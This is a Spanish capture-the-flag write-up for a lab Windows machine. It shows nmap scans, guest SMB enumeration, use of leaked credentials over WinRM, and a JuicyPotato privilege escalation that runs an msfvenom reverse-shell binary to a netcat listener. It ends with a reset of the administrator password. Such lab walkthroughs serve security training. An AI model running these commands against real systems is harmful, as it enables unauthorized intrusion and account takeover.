# Máquina Chimichurri
### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.191

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49667,49669,49670,49671,49674,49692 -vvv -Pn 192.168.5.191

![alt text](image-2.png)

![alt text](image-3.png)

### Explotación 

Como tengo el servicio de SMB enumero recursos compartidos con el usuario invitado

smbmap -h 192.168.5.191 -u invitado

![alt text](image-4.png)

entro al recurso compartido con smbclient

smbclient -U invitado //192.168.5.191/drogas 

descargué el archivo credenciales.txt

![alt text](image-5.png)

visualizo el contenido del archivo credenciales.txt

![alt text](image-6.png)

en el puerto 6969 corre Jenkins

![alt text](image-7.png)

la versión es 2.361.4 y encontré un exploit https://www.exploit-db.com/exploits/51993

![alt text](image-9.png)

![alt text](image-8.png)

como tenemos el servicio de WinRM corriendo por el puerto 5985

verifico si estas credenciales tienen acceso a winrm

nxc winrm 192.168.5.191 -u 'hacker' -p 'Perico69'

![alt text](image-11.png)

entonces me conecto mediante evil-winrm

evil-winrm -i 192.168.5.191 -u 'hacker' -p 'Perico69'

a la vez veo los privilegios

![alt text](image-10.png)

### POST-EXPLOTACIÓN

como tengo el privilegio 

![alt text](image-12.png)

utilicé la herramienta JuicyPotato.exe -> https://github.com/ohpe/juicy-potato/releases/tag/v0.1

![alt text](image-14.png)

para utilizar esta herramienta debo crear un binario .exe con msfvenom

![alt text](image-13.png)

luego lo subimos a la víctima

![alt text](image-15.png)

me pongo en escucha con el puerto 443 con netcat y ejecuto el comando:

./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 443 -a "/c C:\Users\hacker\Documents\shell.exe"

![alt text](image-16.png)

al intentar ver las banderas me sale acceso denegado

![alt text](image-17.png)

entonces cambié la contraseña del usuario administrador

![alt text](image-18.png)

ahora me conecto por evil-winrm

![alt text](image-19.png)

### user.txt

![alt text](image-21.png)

### root.txt

![alt text](image-20.png)